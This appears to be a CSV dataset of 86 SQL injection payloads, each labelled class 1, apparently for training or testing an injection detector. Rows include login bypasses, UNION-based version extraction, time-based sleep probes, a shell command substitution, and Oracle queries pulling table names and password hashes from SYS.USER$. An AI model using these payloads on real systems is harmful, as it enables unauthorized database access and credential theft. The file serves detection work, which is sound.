index,payload,class
1,""" or pg_sleep  (  __TIME__  )  --",1
2," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
3," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1
4," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1
5, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1
6,select * from users where id  =  1 +$+ or 1  =  1 -- 1,1
7,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
8," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1
9," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1
10,? or 1  =  1 --,1
11, )   or   (  'a'  =  'a,1
12,admin' or 1  =  1#,1
13," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1
14,or 1  =  1 --,1
15," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
16," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1
17," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1
18," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1
19,distinct,1
20,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1
21,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
22,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1
23,"admin"" or ""1""  =  ""1""--",1
24," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1
25,insert,1
26," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1
27," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1
28," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
29," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1
30,"or 1  =  1 or """"  =  ",1
31,/**/or/**/1/**/  =  /**/1,1
32," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1
33," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1
34," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1
35,or 1  =  1/*,1
36,%27 or 1  =  1,1
37," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1
38," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
40," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1
41,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1
42," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1
43," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
45,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1
46," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1
47," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1
49,or 1 --',1
50," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1
51,"admin"" or 1  =  1#",1
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1
53,\x27UNION SELECT,1
54,PRINT,1
55," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
56,or 1  =  1--,1
57,1 or pg_sleep  (  __TIME__  )  --,1
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1
59,admin'  )   or   (  '1'  =  '1'/*,1
60,or 2 between 1 and 3,1
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1
62," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1
63,admin' or '1'  =  '1,1
64," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
65,""" or 0  =  0 --",1
66," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1
67,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1
68," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1
69," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1
70," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1
71,char%4039%41%2b%40SELECT,1
72," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1
73,admin'  )   or   (  '1'  =  '1,1
74,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1
75,"or 0  =  0 #""",1
76," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1
77,  )   or   (  'x'  =  'x,1
78," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1
79,$  (  sleep 50  ) ,1
80," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1
81,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1
82," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1
83," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1
84," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1
85,"""a"""" or 1  =  1--""",1
86," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1
